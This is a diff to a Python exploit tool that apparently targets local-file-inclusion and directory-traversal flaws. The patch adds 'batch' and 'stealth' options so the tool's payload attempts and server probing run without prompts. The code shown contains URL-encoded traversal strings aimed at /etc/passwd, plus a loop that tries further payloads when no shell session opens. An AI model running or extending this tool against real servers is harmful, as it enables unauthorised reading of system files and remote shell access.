@@ -17,13 +17,15 @@ import base64
 
 class Payload:
 
-	def __init__(self, url, outfile, creds, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], verbosity=1, proxies=False, crawler=False, attempt_shell=False, mode=0, force=False):
+	def __init__(self, url, outfile, creds, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], verbosity=1, proxies=False, crawler=False, attempt_shell=False, mode=0, force=False, batch=None, stealth=False):
 		requests.packages.urllib3.disable_warnings() # Comment out to stop suppressing warnings.
 		self.url = url.strip()
 		self.verbosity = verbosity
 		self.outfile = outfile
 		self.crawler = crawler
 		self.creds = creds
+		self.batch = batch
+		self.stealth = stealth
 		self.linux_dirTraversal = ["%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E"]
 		# poc -> Proof Of Concept (Change it if you want)
 		self.poc = poc
@@ -59,10 +61,14 @@ class Payload:
 		time.sleep(2)
 		if not self.conn:
 			print(colored("[-]", 'red') + " Exploit completed but no sessions were created!")
-			print(colored("Do you want to try other payloads? (Y/n) ", 'yellow'), end='')
-			ans = str(input())
-			if 'n' in ans.lower():
-				os._exit(0)
+			if self.batch == None:
+				print(colored("Do you want to try other payloads? (Y/n) ", 'yellow'), end='')
+				ans = str(input())
+				if 'n' in ans.lower():
+					os._exit(0)
+			else:
+				if not self.batch:
+					os._exit(0)
 			session = False
 			for payload in self.payloads:
 				print(colored("[*]", 'yellow') + " Trying: " + payload)
@@ -322,19 +328,27 @@ class Payload:
 		# Check to see if the server leaks a Server Header.
 		if not 'Server' in response.headers.keys():
 			print(colored('[-]', 'red') + " Server does not leak the Server Header. It's impossible to tell if it's running nginx or apache.")
-			print(colored('[?]', 'yellow') + " Hit every known server type? [y/N]: ", end='')
-			ans = str(input())
-			print(ans)
-			if 'y' in ans.lower():
-				# Attempt to hit apache files first
-				ret = self.hitApache()	
-				# If we get a hit then return that. (No need to hit Nginx files)
-				if ret:
-					return ret
-				# Otherwise hit Nginx Files and return the results no matter what they are
-				return self.hitNginx()
-			else:
+			if self.batch == False:
 				return False
+			else:
+				if self.batch == True:
+					ans = True
+				else:
+					print(colored('[?]', 'yellow') + " Hit every known server type? [y/N]: ", end='')
+					ans = str(input())
+
+					if 'y' in ans.lower():
+						ans = True
+					else:
+						ans = False
+				if ans == True:
+					# Attempt to hit apache files first
+					ret = self.hitApache()	
+					# If we get a hit then return that. (No need to hit Nginx files)
+					if ret:
+						return ret
+					# Otherwise hit Nginx Files and return the results no matter what they are
+					return self.hitNginx()
 
 		# checks the type of the server
 		if "apache" in response.headers['Server'].lower():
